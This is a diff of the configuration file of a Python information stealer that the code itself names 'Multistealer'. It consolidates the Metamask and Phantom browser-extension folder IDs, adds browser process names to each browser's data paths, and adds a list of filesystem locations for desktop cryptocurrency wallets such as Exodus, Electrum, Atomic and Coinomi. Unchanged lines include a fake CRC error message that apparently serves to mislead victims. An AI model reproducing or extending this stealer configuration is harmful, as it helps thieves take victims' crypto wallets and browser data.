@@ -35,68 +35,16 @@ class ChromiumConfig:
     HistoryData = "URL: {0}\nTitle: {1}\nLast Visit: {2}\n\n"
     BookmarksData = "Title: {0}\nUrl: {1}\n\n"
 
-    WalletLogs = {
-        Browsers.CHROME.value: [
-            {
-                "name": "Metamask",
-                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
-            },
-            {
-                "name": "Phantom",
-                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
-            }
-        ],
-        Browsers.OPERA_GX.value: [
-            {
-                "name": "Metamask",
-                "folder": "djclckkglechooblngghdinmeemkbgci"
-            },
-            {
-                "name": "Phantom",
-                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
-            }
-        ],
-        Browsers.OPERA_DEFAULT.value: [
-            {
-                "name": "Metamask",
-                "folder": "djclckkglechooblngghdinmeemkbgci"
-            },
-            {
-                "name": "Phantom",
-                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
-            }
-        ],
-        Browsers.EDGE.value: [
-            {
-                "name": "Metamask",
-                "folder": "ejbalbakoplchlghecdalmeeeajnimhm"
-            },
-            {
-                "name": "Phantom",
-                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
-            }
-        ],
-        Browsers.BRAVE.value: [
-            {
-                "name": "Metamask",
-                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
-            },
-            {
-                "name": "Phantom",
-                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
-            }
-        ],
-        Browsers.YANDEX.value: [
-            {
-                "name": "Metamask",
-                "folder": "nkbihfbeogaeaoehlefnkodbefgpgknn"
-            },
-            {
-                "name": "Phantom",
-                "folder": "bfnaelmomeimhlpmgjnjophhpkkoljpa"
-            }
-        ]
-    }
+    WalletLogs = [
+        {
+            "name": "Metamask",
+            "folders": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "djclckkglechooblngghdinmeemkbgci", "ejbalbakoplchlghecdalmeeeajnimhm"]
+        },
+        {
+            "name": "Phantom",
+            "folders": ["bfnaelmomeimhlpmgjnjophhpkkoljpa"]
+        }
+    ]
 
 
 class MultistealerConfig:
@@ -108,36 +56,43 @@ class MultistealerConfig:
     ChromePaths = (
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
+        "chrome.exe"
     )
 
     OperaGXPaths = (
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
+        "opera.exe"
     )
 
     OperaDefaultPaths = (
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\Local State",
         rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
+        "opera.exe"
     )
 
     MicrosoftEdgePaths = (
         rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State",
         rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
+        "msedge.exe"
     )
 
     BravePaths = (
         rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
         rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+        "brave.exe"
     )
 
     VivaldiPaths = (
         rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
         rf"{user_profile}\AppData\Local\Vivaldi\User Data",
+        "vivaldi.exe"
     )
 
     YandexPaths = (
         rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data\Local State",
         rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
+        "browser.exe"
     )
 
 
@@ -183,3 +138,45 @@ class MessageConfig:
 
     MessageTitle = "0x17"
     MessageDescription = "ERROR_CRC: Data error (cyclic redundancy check)."
+
+
+class WalletsConfig:
+
+    WalletPaths = [
+        {
+            "name": "Atomic",
+            "path": rf"{user_profile}\AppData\Roaming\atomic\Local Storage\leveldb"
+        },
+        {
+            "name": "Exodus",
+            "path": rf"{user_profile}\AppData\Roaming\Exodus\exodus.wallet"
+        },
+        {
+            "name": "Electrum",
+            "path": rf"{user_profile}\AppData\Roaming\Electrum\wallets"
+        },
+        {
+            "name": "Ethereum",
+            "path": rf"{user_profile}\AppData\Roaming\Ethereum\keystore"
+        },
+        {
+            "name": "Armory",
+            "path": rf"{user_profile}\AppData\Roaming\Armory"
+        },
+        {
+            "name": "Bytecoin",
+            "path": rf"{user_profile}\AppData\Roaming\bytecoin"
+        },
+        {
+            "name": "Guarda",
+            "path": rf"{user_profile}\AppData\Roaming\Guarda\Local Storage\leveldb"
+        },
+        {
+            "name": "Coinomi",
+            "path": rf"{user_profile}\AppData\Local\Coinomi\Coinomi\wallets"
+        },
+        {
+            "name": "Zcash",
+            "path": rf"{user_profile}\AppData\Local\Zcash"
+        },
+    ]
